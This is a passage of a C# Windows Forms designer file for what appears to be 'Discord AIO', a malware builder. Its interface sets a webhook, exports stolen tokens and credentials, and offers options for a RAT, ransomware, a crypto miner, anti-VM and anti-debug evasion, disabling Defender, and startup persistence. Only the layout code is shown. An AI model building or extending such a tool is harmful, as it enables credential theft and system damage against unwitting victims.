            this.versionLabel.Text = "0.6.0";
            // 
            // checkingLabel
            // 
            this.checkingLabel.AutoSize = true;
            this.checkingLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.checkingLabel.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(5)))), ((int)(((byte)(5)))), ((int)(((byte)(5)))));
            this.checkingLabel.Location = new System.Drawing.Point(161, 23);
            this.checkingLabel.Name = "checkingLabel";
            this.checkingLabel.Size = new System.Drawing.Size(27, 16);
            this.checkingLabel.TabIndex = 20;
            this.checkingLabel.Text = "null";
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label3.ForeColor = System.Drawing.Color.DarkRed;
            this.label3.Location = new System.Drawing.Point(5, 139);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(153, 24);
            this.label3.TabIndex = 2;
            this.label3.Text = "Show username:";
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label2.ForeColor = System.Drawing.Color.DarkRed;
            this.label2.Location = new System.Drawing.Point(5, 88);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(82, 24);
            this.label2.TabIndex = 1;
            this.label2.Text = "UI Color:";
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label1.ForeColor = System.Drawing.Color.DarkRed;
            this.label1.Location = new System.Drawing.Point(5, 35);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(80, 24);
            this.label1.TabIndex = 0;
            this.label1.Text = "Version:";
            // 
            // mainSite
            // 
            this.mainSite.Controls.Add(this.label38);
            this.mainSite.Controls.Add(this.embedBox);
            this.mainSite.Controls.Add(this.colorSelect);
            this.mainSite.Controls.Add(this.label9);
            this.mainSite.Controls.Add(this.cloneButton);
            this.mainSite.Controls.Add(this.generateButton);
            this.mainSite.Controls.Add(this.fileinfoLabel);
            this.mainSite.Controls.Add(this.label8);
            this.mainSite.Controls.Add(this.iconUpload);
            this.mainSite.Controls.Add(this.iconBox);
            this.mainSite.Controls.Add(this.label6);
            this.mainSite.Controls.Add(this.label4);
            this.mainSite.Location = new System.Drawing.Point(26, 19);
            this.mainSite.Name = "mainSite";
            this.mainSite.Size = new System.Drawing.Size(1228, 495);
            this.mainSite.TabIndex = 5;
            // 
            // label38
            // 
            this.label38.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label38.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(5)))), ((int)(((byte)(5)))), ((int)(((byte)(5)))));
            this.label38.Location = new System.Drawing.Point(639, 13);
            this.label38.Name = "label38";
            this.label38.Size = new System.Drawing.Size(67, 29);
            this.label38.TabIndex = 16;
            this.label38.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // embedBox
            // 
            this.embedBox.BackColor = System.Drawing.Color.Aqua;
            this.embedBox.Location = new System.Drawing.Point(206, 166);
            this.embedBox.Name = "embedBox";
            this.embedBox.Size = new System.Drawing.Size(63, 63);
            this.embedBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.embedBox.TabIndex = 14;
            this.embedBox.TabStop = false;
            // 
            // colorSelect
            // 
            this.colorSelect.Cursor = System.Windows.Forms.Cursors.Hand;
            this.colorSelect.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.colorSelect.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.colorSelect.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.colorSelect.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F);
            this.colorSelect.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(128)))), ((int)(((byte)(0)))));
            this.colorSelect.Location = new System.Drawing.Point(206, 235);
            this.colorSelect.Name = "colorSelect";
            this.colorSelect.Size = new System.Drawing.Size(83, 24);
            this.colorSelect.TabIndex = 13;
            this.colorSelect.Text = "Select";
            this.colorSelect.UseVisualStyleBackColor = true;
            this.colorSelect.Click += new System.EventHandler(this.colorSelect_Click);
            // 
            // label9
            // 
            this.label9.AutoSize = true;
            this.label9.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label9.ForeColor = System.Drawing.Color.DarkRed;
            this.label9.Location = new System.Drawing.Point(201, 139);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(98, 20);
            this.label9.TabIndex = 12;
            this.label9.Text = "Embed color";
            // 
            // cloneButton
            // 
            this.cloneButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.cloneButton.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.cloneButton.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.cloneButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.cloneButton.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F);
            this.cloneButton.ForeColor = System.Drawing.Color.DarkRed;
            this.cloneButton.Location = new System.Drawing.Point(129, 324);
            this.cloneButton.Name = "cloneButton";
            this.cloneButton.Size = new System.Drawing.Size(83, 24);
            this.cloneButton.TabIndex = 11;
            this.cloneButton.Text = "Clone";
            this.cloneButton.UseVisualStyleBackColor = true;
            this.cloneButton.Click += new System.EventHandler(this.cloneButton_Click);
            // 
            // generateButton
            // 
            this.generateButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.generateButton.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.generateButton.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.generateButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.generateButton.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F);
            this.generateButton.ForeColor = System.Drawing.Color.DarkRed;
            this.generateButton.Location = new System.Drawing.Point(40, 324);
            this.generateButton.Name = "generateButton";
            this.generateButton.Size = new System.Drawing.Size(83, 24);
            this.generateButton.TabIndex = 10;
            this.generateButton.Text = "Generate";
            this.generateButton.UseVisualStyleBackColor = true;
            this.generateButton.Click += new System.EventHandler(this.generateButton_Click);
            // 
            // fileinfoLabel
            // 
            this.fileinfoLabel.AutoSize = true;
            this.fileinfoLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.fileinfoLabel.ForeColor = System.Drawing.Color.DarkRed;
            this.fileinfoLabel.Location = new System.Drawing.Point(137, 293);
            this.fileinfoLabel.Name = "fileinfoLabel";
            this.fileinfoLabel.Size = new System.Drawing.Size(51, 20);
            this.fileinfoLabel.TabIndex = 9;
            this.fileinfoLabel.Text = "None";
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label8.ForeColor = System.Drawing.Color.DarkRed;
            this.label8.Location = new System.Drawing.Point(35, 293);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(81, 20);
            this.label8.TabIndex = 8;
            this.label8.Text = "Metadata:";
            // 
            // iconUpload
            // 
            this.iconUpload.Cursor = System.Windows.Forms.Cursors.Hand;
            this.iconUpload.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.iconUpload.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.iconUpload.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.iconUpload.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F);
            this.iconUpload.ForeColor = System.Drawing.Color.DarkRed;
            this.iconUpload.Location = new System.Drawing.Point(40, 237);
            this.iconUpload.Name = "iconUpload";
            this.iconUpload.Size = new System.Drawing.Size(83, 24);
            this.iconUpload.TabIndex = 6;
            this.iconUpload.Text = "Upload";
            this.iconUpload.UseVisualStyleBackColor = true;
            this.iconUpload.Click += new System.EventHandler(this.iconUpload_Click);
            // 
            // iconBox
            // 
            this.iconBox.Location = new System.Drawing.Point(40, 166);
            this.iconBox.Name = "iconBox";
            this.iconBox.Size = new System.Drawing.Size(63, 63);
            this.iconBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.iconBox.TabIndex = 5;
            this.iconBox.TabStop = false;
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label6.ForeColor = System.Drawing.Color.DarkRed;
            this.label6.Location = new System.Drawing.Point(35, 139);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(40, 20);
            this.label6.TabIndex = 4;
            this.label6.Text = "Icon";
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label4.ForeColor = System.Drawing.Color.DarkRed;
            this.label4.Location = new System.Drawing.Point(35, 60);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(77, 20);
            this.label4.TabIndex = 2;
            this.label4.Text = "Webhook";
            // 
            // inspectorSite
            // 
            this.inspectorSite.Controls.Add(this.label16);
            this.inspectorSite.Controls.Add(this.exportCredentials);
            this.inspectorSite.Controls.Add(this.winBox);
            this.inspectorSite.Controls.Add(this.additionalSite);
            this.inspectorSite.Controls.Add(this.tokenBox);
            this.inspectorSite.Controls.Add(this.macBox);
            this.inspectorSite.Controls.Add(this.ipBox);
            this.inspectorSite.Controls.Add(this.nameBox);
            this.inspectorSite.Controls.Add(this.label15);
            this.inspectorSite.Controls.Add(this.label13);
            this.inspectorSite.Controls.Add(this.label12);
            this.inspectorSite.Controls.Add(this.label11);
            this.inspectorSite.Controls.Add(this.label10);
            this.inspectorSite.Controls.Add(this.dAIOupload);
            this.inspectorSite.Controls.Add(this.label14);
            this.inspectorSite.Controls.Add(this.dAIObox);
            this.inspectorSite.Location = new System.Drawing.Point(742, 63);
            this.inspectorSite.Name = "inspectorSite";
            this.inspectorSite.Size = new System.Drawing.Size(751, 522);
            this.inspectorSite.TabIndex = 15;
            // 
            // label16
            // 
            this.label16.AutoSize = true;
            this.label16.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label16.ForeColor = System.Drawing.Color.DarkRed;
            this.label16.Location = new System.Drawing.Point(35, 375);
            this.label16.Name = "label16";
            this.label16.Size = new System.Drawing.Size(111, 20);
            this.label16.TabIndex = 12;
            this.label16.Text = "Export (as .txt)";
            // 
            // exportCredentials
            // 
            this.exportCredentials.Cursor = System.Windows.Forms.Cursors.Hand;
            this.exportCredentials.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.exportCredentials.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.exportCredentials.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.exportCredentials.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.exportCredentials.ForeColor = System.Drawing.Color.DarkRed;
            this.exportCredentials.Location = new System.Drawing.Point(46, 433);
            this.exportCredentials.Name = "exportCredentials";
            this.exportCredentials.Size = new System.Drawing.Size(123, 30);
            this.exportCredentials.TabIndex = 11;
            this.exportCredentials.Text = "Credentials";
            this.exportCredentials.UseVisualStyleBackColor = true;
            this.exportCredentials.Click += new System.EventHandler(this.exportCredentials_Click);
            // 
            // winBox
            // 
            this.winBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(10)))), ((int)(((byte)(10)))));
            this.winBox.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.winBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.winBox.ForeColor = System.Drawing.Color.DarkRed;
            this.winBox.Location = new System.Drawing.Point(190, 293);
            this.winBox.Name = "winBox";
            this.winBox.ReadOnly = true;
            this.winBox.Size = new System.Drawing.Size(391, 19);
            this.winBox.TabIndex = 10;
            // 
            // additionalSite
            // 
            this.additionalSite.Controls.Add(this.fakesButton);
            this.additionalSite.Controls.Add(this.ratBox);
            this.additionalSite.Controls.Add(this.dinternetBox);
            this.additionalSite.Controls.Add(this.pluginSource);
            this.additionalSite.Controls.Add(this.label21);
            this.additionalSite.Controls.Add(this.label20);
            this.additionalSite.Controls.Add(this.fakeMessageBox);
            this.additionalSite.Controls.Add(this.faketitleBox);
            this.additionalSite.Controls.Add(this.label19);
            this.additionalSite.Controls.Add(this.label18);
            this.additionalSite.Controls.Add(this.ransomBox);
            this.additionalSite.Controls.Add(this.emuBox);
            this.additionalSite.Controls.Add(this.sandboxBox);
            this.additionalSite.Controls.Add(this.vmBox);
            this.additionalSite.Controls.Add(this.debugBox);
            this.additionalSite.Controls.Add(this.sniffersBox);
            this.additionalSite.Controls.Add(this.cryptoBox);
            this.additionalSite.Controls.Add(this.inputdBox);
            this.additionalSite.Controls.Add(this.jumpscareBox);
            this.additionalSite.Controls.Add(this.blockerBox);
            this.additionalSite.Controls.Add(this.pluginBox);
            this.additionalSite.Controls.Add(this.bsodBox);
            this.additionalSite.Controls.Add(this.taskmanagerBox);
            this.additionalSite.Controls.Add(this.defenderBox);
            this.additionalSite.Controls.Add(this.startupBox);
            this.additionalSite.Controls.Add(this.errorBox);
            this.additionalSite.Controls.Add(this.obfuscateBox);
            this.additionalSite.Controls.Add(this.label17);
            this.additionalSite.Location = new System.Drawing.Point(42, 3);
            this.additionalSite.Name = "additionalSite";
            this.additionalSite.Size = new System.Drawing.Size(751, 532);
            this.additionalSite.TabIndex = 16;
            // 
            // fakesButton
            // 
            this.fakesButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.fakesButton.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.fakesButton.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.fakesButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.fakesButton.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F);
            this.fakesButton.ForeColor = System.Drawing.Color.DarkRed;
            this.fakesButton.Location = new System.Drawing.Point(195, 33);
            this.fakesButton.Name = "fakesButton";
            this.fakesButton.Size = new System.Drawing.Size(107, 24);
            this.fakesButton.TabIndex = 40;
            this.fakesButton.Text = "More fakes?";
            this.fakesButton.UseVisualStyleBackColor = true;
            this.fakesButton.Click += new System.EventHandler(this.fakesButton_Click);
            // 
            // ratBox
            // 
            this.ratBox.AutoSize = true;
            this.ratBox.Cursor = System.Windows.Forms.Cursors.Hand;
            this.ratBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.ratBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.ratBox.ForeColor = System.Drawing.Color.DarkRed;
            this.ratBox.Location = new System.Drawing.Point(177, 457);
            this.ratBox.Name = "ratBox";
            this.ratBox.Size = new System.Drawing.Size(91, 19);
            this.ratBox.TabIndex = 16;
            this.ratBox.Text = "Discord RAT";
            this.ratBox.UseVisualStyleBackColor = true;
            // 
            // dinternetBox
            // 
            this.dinternetBox.AutoSize = true;
            this.dinternetBox.Cursor = System.Windows.Forms.Cursors.Hand;
            this.dinternetBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.dinternetBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.dinternetBox.ForeColor = System.Drawing.Color.DarkRed;
            this.dinternetBox.Location = new System.Drawing.Point(177, 487);
            this.dinternetBox.Name = "dinternetBox";
            this.dinternetBox.Size = new System.Drawing.Size(109, 19);
            this.dinternetBox.TabIndex = 16;
            this.dinternetBox.Text = "Disable internet";
            this.dinternetBox.UseVisualStyleBackColor = true;
            // 
            // pluginSource
            // 
            this.pluginSource.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.pluginSource.Location = new System.Drawing.Point(392, 187);
            this.pluginSource.Name = "pluginSource";
            this.pluginSource.Size = new System.Drawing.Size(335, 296);
            this.pluginSource.TabIndex = 15;
            this.pluginSource.Text = "string message = \"Discord AIO\";\r\nMessageBox.Show(message);\r\n";
            // 
            // label21
            // 
            this.label21.AutoSize = true;
            this.label21.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label21.ForeColor = System.Drawing.Color.DarkRed;
            this.label21.Location = new System.Drawing.Point(648, 102);
            this.label21.Name = "label21";
            this.label21.Size = new System.Drawing.Size(69, 18);
            this.label21.TabIndex = 14;
            this.label21.Text = "Message";
            // 
            // label20
            // 
            this.label20.AutoSize = true;
            this.label20.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label20.ForeColor = System.Drawing.Color.DarkRed;
            this.label20.Location = new System.Drawing.Point(648, 61);
            this.label20.Name = "label20";
            this.label20.Size = new System.Drawing.Size(35, 18);
            this.label20.TabIndex = 13;
            this.label20.Text = "Title";
            // 
            // fakeMessageBox
            // 
            this.fakeMessageBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(10)))), ((int)(((byte)(10)))));
            this.fakeMessageBox.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.fakeMessageBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.fakeMessageBox.ForeColor = System.Drawing.Color.DarkRed;
            this.fakeMessageBox.Location = new System.Drawing.Point(392, 101);
            this.fakeMessageBox.Name = "fakeMessageBox";
            this.fakeMessageBox.Size = new System.Drawing.Size(250, 19);
            this.fakeMessageBox.TabIndex = 12;
            // 
            // faketitleBox
            // 
            this.faketitleBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(10)))), ((int)(((byte)(10)))));
            this.faketitleBox.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.faketitleBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.faketitleBox.ForeColor = System.Drawing.Color.DarkRed;
            this.faketitleBox.Location = new System.Drawing.Point(392, 61);
            this.faketitleBox.Name = "faketitleBox";
            this.faketitleBox.Size = new System.Drawing.Size(250, 19);
            this.faketitleBox.TabIndex = 11;
            // 
            // label19
            // 
            this.label19.AutoSize = true;
            this.label19.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label19.ForeColor = System.Drawing.Color.DarkRed;
            this.label19.Location = new System.Drawing.Point(387, 156);
            this.label19.Name = "label19";
            this.label19.Size = new System.Drawing.Size(110, 20);
            this.label19.TabIndex = 10;
            this.label19.Text = "Custom plugin";
            // 
            // label18
            // 
            this.label18.AutoSize = true;
            this.label18.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label18.ForeColor = System.Drawing.Color.DarkRed;
            this.label18.Location = new System.Drawing.Point(387, 32);
            this.label18.Name = "label18";
            this.label18.Size = new System.Drawing.Size(82, 20);
            this.label18.TabIndex = 9;
            this.label18.Text = "Fake error";
            // 
            // ransomBox
            // 
            this.ransomBox.AutoSize = true;
            this.ransomBox.Cursor = System.Windows.Forms.Cursors.No;
            this.ransomBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.ransomBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.ransomBox.ForeColor = System.Drawing.Color.DimGray;
            this.ransomBox.Location = new System.Drawing.Point(174, 113);
            this.ransomBox.Name = "ransomBox";
            this.ransomBox.Size = new System.Drawing.Size(97, 19);
            this.ransomBox.TabIndex = 8;
            this.ransomBox.Text = "Ransomware";
            this.ransomBox.UseVisualStyleBackColor = true;
            // 
            // emuBox
            // 
            this.emuBox.AutoSize = true;
            this.emuBox.Cursor = System.Windows.Forms.Cursors.Hand;
            this.emuBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.emuBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.emuBox.ForeColor = System.Drawing.Color.DarkRed;
            this.emuBox.Location = new System.Drawing.Point(174, 307);
            this.emuBox.Name = "emuBox";
            this.emuBox.Size = new System.Drawing.Size(101, 19);
            this.emuBox.TabIndex = 7;
            this.emuBox.Text = "Anti emulation";
            this.emuBox.UseVisualStyleBackColor = true;
            // 
            // sandboxBox
            // 
            this.sandboxBox.AutoSize = true;
            this.sandboxBox.Cursor = System.Windows.Forms.Cursors.Hand;
            this.sandboxBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.sandboxBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.sandboxBox.ForeColor = System.Drawing.Color.DarkRed;
            this.sandboxBox.Location = new System.Drawing.Point(174, 278);
            this.sandboxBox.Name = "sandboxBox";
            this.sandboxBox.Size = new System.Drawing.Size(93, 19);
            this.sandboxBox.TabIndex = 7;
            this.sandboxBox.Text = "Anti sandbox";
            this.sandboxBox.UseVisualStyleBackColor = true;
            // 
            // vmBox
            // 
            this.vmBox.AutoSize = true;
            this.vmBox.Cursor = System.Windows.Forms.Cursors.Hand;
            this.vmBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.vmBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.vmBox.ForeColor = System.Drawing.Color.DarkRed;
            this.vmBox.Location = new System.Drawing.Point(174, 250);
            this.vmBox.Name = "vmBox";
            this.vmBox.Size = new System.Drawing.Size(64, 19);
            this.vmBox.TabIndex = 7;
            this.vmBox.Text = "Anti VM";
            this.vmBox.UseVisualStyleBackColor = true;
            // 
            // debugBox
            // 
            this.debugBox.AutoSize = true;
            this.debugBox.Cursor = System.Windows.Forms.Cursors.Hand;
            this.debugBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.debugBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.debugBox.ForeColor = System.Drawing.Color.DarkRed;
            this.debugBox.Location = new System.Drawing.Point(174, 221);
            this.debugBox.Name = "debugBox";
            this.debugBox.Size = new System.Drawing.Size(81, 19);
            this.debugBox.TabIndex = 7;
            this.debugBox.Text = "Anti debug";
            this.debugBox.UseVisualStyleBackColor = true;
            // 
            // sniffersBox
            // 
            this.sniffersBox.AutoSize = true;
            this.sniffersBox.Cursor = System.Windows.Forms.Cursors.Hand;
            this.sniffersBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.sniffersBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.sniffersBox.ForeColor = System.Drawing.Color.DarkRed;
            this.sniffersBox.Location = new System.Drawing.Point(174, 193);
            this.sniffersBox.Name = "sniffersBox";
            this.sniffersBox.Size = new System.Drawing.Size(111, 19);
            this.sniffersBox.TabIndex = 7;
            this.sniffersBox.Text = "Anti web sniffers";
            this.sniffersBox.UseVisualStyleBackColor = true;
            // 
            // cryptoBox
            // 
            this.cryptoBox.AutoSize = true;
            this.cryptoBox.Cursor = System.Windows.Forms.Cursors.Hand;
            this.cryptoBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.cryptoBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.cryptoBox.ForeColor = System.Drawing.Color.DarkRed;
            this.cryptoBox.Location = new System.Drawing.Point(174, 86);
            this.cryptoBox.Name = "cryptoBox";
            this.cryptoBox.Size = new System.Drawing.Size(92, 19);
            this.cryptoBox.TabIndex = 7;
            this.cryptoBox.Text = "Crypto miner";
            this.cryptoBox.UseVisualStyleBackColor = true;
            // 
            // inputdBox
            // 
            this.inputdBox.AutoSize = true;
            this.inputdBox.Cursor = System.Windows.Forms.Cursors.Hand;
            this.inputdBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.inputdBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.inputdBox.ForeColor = System.Drawing.Color.DarkRed;
            this.inputdBox.Location = new System.Drawing.Point(46, 337);
            this.inputdBox.Name = "inputdBox";
            this.inputdBox.Size = new System.Drawing.Size(183, 19);
            this.inputdBox.TabIndex = 5;
            this.inputdBox.Text = "Disable mouse and keyboard";
            this.inputdBox.UseVisualStyleBackColor = true;
            // 
            // jumpscareBox
            // 
            this.jumpscareBox.AutoSize = true;
            this.jumpscareBox.Cursor = System.Windows.Forms.Cursors.Hand;
            this.jumpscareBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.jumpscareBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.jumpscareBox.ForeColor = System.Drawing.Color.DarkRed;
            this.jumpscareBox.Location = new System.Drawing.Point(46, 307);
            this.jumpscareBox.Name = "jumpscareBox";
            this.jumpscareBox.Size = new System.Drawing.Size(84, 19);
            this.jumpscareBox.TabIndex = 5;
            this.jumpscareBox.Text = "Jumpscare";
            this.jumpscareBox.UseVisualStyleBackColor = true;
            // 
            // blockerBox
            // 
            this.blockerBox.AutoSize = true;
            this.blockerBox.Cursor = System.Windows.Forms.Cursors.Hand;
            this.blockerBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.blockerBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.blockerBox.ForeColor = System.Drawing.Color.DarkRed;
            this.blockerBox.Location = new System.Drawing.Point(46, 250);
            this.blockerBox.Name = "blockerBox";
            this.blockerBox.Size = new System.Drawing.Size(110, 19);
            this.blockerBox.TabIndex = 5;
            this.blockerBox.Text = "Website blocker";
            this.blockerBox.UseVisualStyleBackColor = true;
            // 
            // pluginBox
            // 
            this.pluginBox.AutoSize = true;
            this.pluginBox.Cursor = System.Windows.Forms.Cursors.Hand;
            this.pluginBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.pluginBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.pluginBox.ForeColor = System.Drawing.Color.DarkRed;
            this.pluginBox.Location = new System.Drawing.Point(46, 221);
            this.pluginBox.Name = "pluginBox";
            this.pluginBox.Size = new System.Drawing.Size(102, 19);
            this.pluginBox.TabIndex = 5;
            this.pluginBox.Text = "Custom plugin";
            this.pluginBox.UseVisualStyleBackColor = true;
            // 
            // bsodBox
            // 
